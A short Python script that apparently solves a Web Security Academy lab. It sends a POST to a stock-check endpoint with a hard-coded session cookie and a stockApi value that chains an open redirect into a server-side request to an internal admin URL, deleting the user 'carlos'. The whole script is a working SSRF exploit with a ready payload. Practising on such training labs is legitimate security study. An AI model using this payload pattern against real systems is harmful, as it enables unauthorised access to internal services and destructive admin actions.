import requests
url = 'https://0a94009e0482877a87a8365800eb00cb.web-security-academy.net/product/stock'

header = {
    'Cookie' : 'session=nEwvsZ5vBbPOU0xR2CmrdyLW40ZtDexe',
    'Origin' : 'https://0a550054031b344181fbac1300f700f1.web-security-academy.net',
    'Referer' : 'https://0a94009e0482877a87a8365800eb00cb.web-security-academy.net/product?productId=1',
    'Content-Type' : 'application/x-www-form-urlencoded'
}

data = {
    "stockApi" : '/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos'
}

print(data)
response = requests.post(url, headers=header, data=data)
print(f'request respon {response.status_code}')
print(f'data {response.text}')